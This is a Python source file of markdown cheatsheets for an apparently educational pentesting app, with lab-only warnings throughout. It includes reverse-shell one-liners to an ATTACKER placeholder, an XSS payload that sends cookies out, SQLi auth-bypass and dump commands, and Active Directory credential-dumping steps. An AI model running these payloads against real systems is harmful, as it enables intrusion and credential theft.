# -*- coding: utf-8 -*-
# Cybersecurity-Mastery - an interactive, offline cybersecurity learning app.
# Copyright (C) 2026 Nithees Narendra S
# SPDX-License-Identifier: GPL-3.0-or-later
#
# This file is part of Cybersecurity-Mastery. It is free software: you can
# redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version. There is NO WARRANTY. See the
# LICENSE file for the full text. For use outside the GPL-3.0 terms (e.g.
# proprietary/commercial), contact the copyright holder for a separate licence.

"""Real, printable cheatsheet bodies keyed by cheatsheet slug.

Consumed by generate.py's render_cheatsheet(). Slugs not present fall back to the
structured placeholder. All content is standard, widely-published reference
material for authorised testing and defence, to be used only against systems you
own or are permitted to test.
"""

CHEATS = {
    "linux-commands": r"""
## Navigation & files
| Command | Purpose |
| --- | --- |
| `pwd` / `cd -` | Print working dir / jump to previous dir |
| `ls -la` | Long listing incl. hidden & permissions |
| `find / -name '*.conf' 2>/dev/null` | Find files, suppress errors |
| `find / -perm -4000 2>/dev/null` | Find SUID binaries (privesc triage) |
| `grep -rn "password" .` | Recursive search with line numbers |
| `stat file` | Timestamps, inode, permissions |
| `du -sh *` / `df -h` | Dir sizes / filesystem usage |

## Permissions & ownership
| Command | Purpose |
| --- | --- |
| `chmod 640 file` | rw-r----- |
| `chown user:group file` | Set owner/group |
| `umask` | Default permission mask |
| `getcap -r / 2>/dev/null` | Find file capabilities |

## Processes, services, network
| Command | Purpose |
| --- | --- |
| `ps aux --sort=-%mem` | Processes by memory |
| `top` / `htop` | Live process view |
| `systemctl status svc` | Service state |
| `ss -tulpn` | Listening TCP/UDP sockets + PIDs |
| `lsof -i :443` | What holds a port |
| `ip a` / `ip r` | Addresses / routes |

## Users & auth (triage)
| Command | Purpose |
| --- | --- |
| `id` / `whoami` / `groups` | Current identity |
| `sudo -l` | What you can run as root (privesc) |
| `cat /etc/passwd` / `/etc/group` | Accounts / groups |
| `last` / `w` | Login history / who is on |

## Text processing
`cut -d: -f1 /etc/passwd` · `awk -F: '{print $1}' file` · `sed 's/old/new/g' file` ·
`sort | uniq -c | sort -rn` · `tr -d '\r'` · `jq '.'`
""",

    "nmap": r"""
## Host discovery
| Command | Purpose |
| --- | --- |
| `nmap -sn 10.0.0.0/24` | Ping sweep (no port scan) |
| `nmap -Pn host` | Skip discovery, treat as up |
| `nmap -PS22,80,443 host` | TCP SYN discovery on ports |

## Port scanning
| Command | Purpose |
| --- | --- |
| `nmap -sS host` | SYN (half-open) scan — default as root |
| `nmap -sT host` | TCP connect (no root) |
| `nmap -sU host` | UDP scan (slow) |
| `nmap -p-` | All 65535 TCP ports |
| `nmap -p 80,443,8080` | Specific ports |
| `nmap -F` | Fast (top 100) |
| `nmap --top-ports 1000` | Top N ports |

## Service, OS, scripts
| Command | Purpose |
| --- | --- |
| `nmap -sV host` | Version detection |
| `nmap -O host` | OS detection |
| `nmap -A host` | Aggressive: -sV -O -sC --traceroute |
| `nmap -sC host` | Default safe NSE scripts |
| `nmap --script vuln host` | Vuln category scripts |
| `nmap --script "http-*" host` | Category glob |

## Timing & output
| Flag | Purpose |
| --- | --- |
| `-T0..-T5` | paranoid → insane (stealth ↔ speed) |
| `--min-rate/--max-rate` | Packets per second control |
| `-oA base` | Save normal + XML + grepable |
| `-v` / `-d` | Verbose / debug |
| `--reason` | Why a port is in its state |

> Scan only hosts you own or are authorised to test. A `-T4 -p-` full scan is loud; an IDS sees the SYN sweep.
""",

    "sqli-payloads": r"""
> For **authorised** testing against your own labs (bWAPP/DVWA/Juice Shop) only.

## Detection
`'`  ·  `"`  ·  `')`  ·  `';`  ·  `' OR '1'='1`  ·  `" OR ""="`  ·  `1) OR (1=1`

## Auth bypass
```
admin'--
admin'#
' OR 1=1-- -
' OR 'x'='x'-- -
") OR ("1"="1
```

## UNION-based
```
' ORDER BY 5-- -                     # find column count
' UNION SELECT NULL,NULL,NULL-- -    # match columns
' UNION SELECT 1,@@version,3-- -     # reflect a value
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
```

## Blind — boolean & time
| DBMS | Time payload |
| --- | --- |
| MySQL | `' AND SLEEP(5)-- -` / `' OR IF(1=1,SLEEP(5),0)-- -` |
| PostgreSQL | `'; SELECT pg_sleep(5)-- -` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'-- -` |
| Oracle | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -` |

## Useful strings by DBMS
| | Version | Current DB/user |
| --- | --- | --- |
| MySQL | `@@version` | `database()` / `current_user()` |
| PostgreSQL | `version()` | `current_database()` / `current_user` |
| MSSQL | `@@version` | `DB_NAME()` / `SYSTEM_USER` |

## Automation
```bash
sqlmap -u 'http://TARGET/item?id=1' --batch --dbs
sqlmap -u 'http://TARGET/item?id=1' --batch -D db -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3
```
**Fix:** parameterised queries. Everything above fails against bound parameters.
""",

    "xss-payloads": r"""
> For **authorised** testing only. Fire against your own labs.

## Quick detection
```
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
```

## By context
| Context | Payload |
| --- | --- |
| HTML body | `<img src=x onerror=alert(1)>` |
| Attribute | `" autofocus onfocus=alert(1) x="` |
| JS string | `';alert(1);//` |
| URL/href | `javascript:alert(1)` |
| SVG | `<svg onload=alert(1)>` |

## Filter bypass
```
<sCrIpt>alert(1)</sCrIpt>            # case
<img src=x onerror=alert`1`>         # backtick call
<svg/onload=alert(1)>                # no spaces
&#60;script&#62;                      # entity encoding
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">   # base64
```

## Polyglot (multi-context)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNclick=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Proof beyond alert (lab)
```html
<script>fetch('http://ATTACKER:9001/c='+document.cookie)</script>
```
**Fix:** context-aware output encoding + CSP (nonce, strict-dynamic) + Trusted Types + HttpOnly cookies.
""",

    "privesc-linux": r"""
## Automated enumeration
`./linpeas.sh` · `lse.sh -l1` · `linenum.sh` — run first, then verify findings by hand.

## Manual triage
| Check | Command |
| --- | --- |
| Sudo rights | `sudo -l` |
| SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab; ls -la /etc/cron.*` |
| Writable paths in $PATH | `echo $PATH` + check each dir |
| Kernel | `uname -a` (map to known exploits) |
| Interesting files | `find / -writable -type d 2>/dev/null` |
| Creds in files | `grep -rn "password" /etc /var/www 2>/dev/null` |

## Common vectors
- **Sudo misconfig** — `sudo -l` shows a binary; check [GTFOBins](https://gtfobins.github.io) for a shell escape.
- **SUID GTFOBins** — e.g. `find . -exec /bin/sh -p \; -quit` if `find` is SUID.
- **Writable cron/script** run by root → drop a reverse shell.
- **Weak file perms** on `/etc/passwd` or `/etc/shadow` → add/replace a root hash.
- **PATH hijack** on a root-run script that calls a binary by name.
- **Capabilities** — `cap_setuid+ep` on a binary → set uid 0.
- **Docker/lxd group** membership → mount host FS as root.

## GTFOBins pattern (sudo)
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo vim -c ':!/bin/sh'
```
""",

    "privesc-windows": r"""
## Automated enumeration
`winPEASx64.exe` · `PowerUp.ps1 (Invoke-AllChecks)` · `Seatbelt.exe -group=all`

## Manual triage
| Check | Command |
| --- | --- |
| Whoami & privs | `whoami /all` |
| Patch level | `systeminfo` (map to exploits) |
| Services (unquoted/weak) | `wmic service get name,pathname,startmode` |
| Writable service binary | `icacls "C:\path\svc.exe"` |
| AlwaysInstallElevated | `reg query HKLM\...\Installer /v AlwaysInstallElevated` |
| Stored creds | `cmdkey /list`; `reg query HKLM /f password /t REG_SZ /s` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |

## Token / privilege abuse
- **SeImpersonatePrivilege** → Potato family (JuicyPotato/PrintSpoofer/GodPotato) to SYSTEM.
- **SeBackupPrivilege** → read SAM/SYSTEM hives, extract hashes offline.
- **Unquoted service path** with a writable intermediate dir → plant a payload.
- **Weak service ACL** → reconfig `binPath` (`sc config svc binpath= "..."`) and restart.
- **AlwaysInstallElevated** (both HKLM+HKCU set) → run a malicious MSI as SYSTEM.

## Credential hunting
```
findstr /si password *.txt *.ini *.config
type C:\Users\*\AppData\Roaming\...\*      # app creds
```
""",

    "active-directory": r"""
> Attack a lab forest (GOAD) you own. Map each step to MITRE ATT&CK.

## Enumeration
```bash
nxc smb DC_IP -u user -p pass --shares
nxc ldap DC_IP -u user -p pass --users --groups
bloodhound-python -u user -p pass -d domain.local -c All -ns DC_IP
kerbrute userenum -d domain.local --dc DC_IP users.txt
```

## Kerberos attacks
```bash
# AS-REP roasting (no pre-auth)
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP
# Kerberoasting (SPN accounts)
impacket-GetUserSPNs -request -dc-ip DC_IP domain/user:pass
hashcat -m 18200 asrep.hash rockyou.txt      # AS-REP
hashcat -m 13100 spn.hash rockyou.txt        # TGS
```

## Credential access / movement
```bash
# Pass-the-hash
nxc smb TARGETS -u admin -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH admin@TARGET
# DCSync (dump krbtgt / any user)
impacket-secretsdump -just-dc domain/admin@DC_IP
# Dump LSASS creds (on host)
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

## Persistence (lab)
- **Golden Ticket** — with krbtgt hash: `mimikatz kerberos::golden ...`
- **Silver Ticket** — with a service account hash, forge a service ticket.

## Detect
4768/4769 (roasting), 4728/4732 (group add), 4662 + replication from non-DC (DCSync).
""",

    "reverse-shells": r"""
> Catch with `nc -lvnp 9001` (or `rlwrap nc` / pwncat). Lab use only.

## One-liners
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/9001 0>&1
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",9001));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
# PHP
php -r '$s=fsockopen("ATTACKER",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
# Perl
perl -e 'use Socket;$i="ATTACKER";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 9001 >/tmp/f
```

## PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

## Upgrade a dumb shell to a PTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=9001 -f elf -o s.elf` for a generated payload.
""",

    "hashcat": r"""
## Attack modes
| Mode | Meaning |
| --- | --- |
| `-a 0` | Straight (wordlist) |
| `-a 1` | Combination (two lists) |
| `-a 3` | Brute-force / mask |
| `-a 6` | Wordlist + mask |
| `-a 7` | Mask + wordlist |

## Common hash types (`-m`)
| `-m` | Hash |
| --- | --- |
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA-256 |
| 1800 | sha512crypt ($6$) |
| 3200 | bcrypt ($2*$) |
| 1000 | NTLM |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP |
| 22000 | WPA-PBKDF2 (PMKID/handshake) |

## Recipes
```bash
hashcat -m 1000 hashes.txt rockyou.txt                     # NTLM + wordlist
hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule   # with rules
hashcat -m 3200 hash.txt -a 3 ?l?l?l?l?l?d?d               # bcrypt mask
hashcat -m 22000 hs.hc22000 wordlist.txt                   # WPA
hashcat --show -m 1000 hashes.txt                          # show cracked
```
Mask charsets: `?l` a-z · `?u` A-Z · `?d` 0-9 · `?s` symbols · `?a` all · `?b` 0x00-0xff.

## John equivalent
`john --format=NT --wordlist=rockyou.txt hashes.txt` · `john --show hashes.txt`
""",

    "wireshark-filters": r"""
## Capture filters (BPF — set before capture)
| Filter | Matches |
| --- | --- |
| `host 10.0.0.5` | To/from a host |
| `net 10.0.0.0/24` | A subnet |
| `port 443` | A port |
| `tcp port 80 or tcp port 443` | Web traffic |
| `not arp and not stp` | Drop noise |

## Display filters (after capture)
| Filter | Matches |
| --- | --- |
| `ip.addr == 10.0.0.5` | Host either direction |
| `tcp.port == 22` | SSH |
| `http.request.method == "POST"` | POSTs |
| `http.response.code == 200` | 200 OK |
| `dns.qry.name contains "exfil"` | Suspicious DNS |
| `tcp.flags.syn==1 && tcp.flags.ack==0` | SYN scan probes |
| `tls.handshake.type == 1` | ClientHello |
| `frame contains "password"` | Bytes match |
| `tcp.analysis.retransmission` | Retransmits |

## Workflow
Right-click a packet → **Follow → TCP/HTTP Stream** to reassemble a conversation.
**Statistics → Conversations / Protocol Hierarchy** for a top-down view.
`tshark -r cap.pcap -Y 'http.request' -T fields -e ip.dst -e http.host -e http.request.uri`
""",

    "tcpdump": r"""
## Essentials
| Command | Purpose |
| --- | --- |
| `tcpdump -D` | List interfaces |
| `tcpdump -i eth0` | Capture on interface |
| `tcpdump -i eth0 -w out.pcap` | Write to file |
| `tcpdump -r out.pcap` | Read a file |
| `tcpdump -nn` | No name/port resolution |
| `tcpdump -A` / `-X` | ASCII / hex+ASCII payload |
| `tcpdump -c 100` | Stop after N packets |
| `tcpdump -s 0` | Full packet (snaplen) |

## Filters (BPF)
```
tcpdump -i eth0 host 10.0.0.5
tcpdump -i eth0 net 10.0.0.0/24
tcpdump -i eth0 tcp port 443
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'     # SYNs
tcpdump -i eth0 'port 53'                          # DNS
tcpdump -i eth0 'icmp'                             # pings
tcpdump -i eth0 src 10.0.0.5 and dst port 80
```
Combine with `and` / `or` / `not`. Rotate files: `-G 3600 -w cap-%F-%H.pcap`.
""",

    "networking": r"""
## Common ports
| Port | Service | Port | Service |
| --- | --- | --- | --- |
| 20/21 | FTP | 143/993 | IMAP/IMAPS |
| 22 | SSH | 161/162 | SNMP |
| 23 | Telnet | 389/636 | LDAP/LDAPS |
| 25/587 | SMTP | 443 | HTTPS |
| 53 | DNS | 445 | SMB |
| 67/68 | DHCP | 3306 | MySQL |
| 69 | TFTP | 3389 | RDP |
| 80 | HTTP | 5432 | PostgreSQL |
| 88 | Kerberos | 5985/5986 | WinRM |
| 110/995 | POP3/POP3S | 6379 | Redis |
| 123 | NTP | 8080 | HTTP-alt |

## TCP flags & handshake
`SYN → SYN/ACK → ACK` (open). `FIN/ACK` (close). `RST` (reset). Half-open SYN scan never completes the ACK.

## Subnetting quick table
| CIDR | Mask | Hosts |
| --- | --- | --- |
| /24 | 255.255.255.0 | 254 |
| /25 | 255.255.255.128 | 126 |
| /26 | 255.255.255.192 | 62 |
| /27 | 255.255.255.224 | 30 |
| /28 | 255.255.255.240 | 14 |
| /30 | 255.255.255.252 | 2 |

## Private ranges (RFC 1918)
`10.0.0.0/8` · `172.16.0.0/12` · `192.168.0.0/16` · link-local `169.254.0.0/16` · loopback `127.0.0.0/8`
""",

    "web-testing": r"""
## Methodology (per endpoint)
1. **Map** — spider, note every parameter, header, cookie, and hidden field.
2. **Auth/Session** — test login, logout, reset, MFA; check cookie flags and session fixation.
3. **Access control** — swap IDs (IDOR), force-browse admin paths, change roles (BOLA/BFLA).
4. **Injection** — SQLi, NoSQLi, command, SSTI, XXE, LDAP — one payload class at a time.
5. **Client-side** — XSS (all contexts), CSRF, CORS, clickjacking, open redirect.
6. **Business logic** — quantity/price tampering, workflow skipping, race conditions.
7. **Config** — headers (CSP/HSTS), verbose errors, exposed files (`/.git`, backups).

## Fast checks
```bash
whatweb http://TARGET
ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301,302,403
nikto -h http://TARGET
nuclei -u http://TARGET
```

## Header hygiene to verify
`Content-Security-Policy` · `Strict-Transport-Security` · `X-Content-Type-Options: nosniff` ·
`X-Frame-Options` / frame-ancestors · `Set-Cookie: HttpOnly; Secure; SameSite`.

See the [SQLi](sqli-payloads.md) and [XSS](xss-payloads.md) payload cheatsheets for injection strings.
""",
}
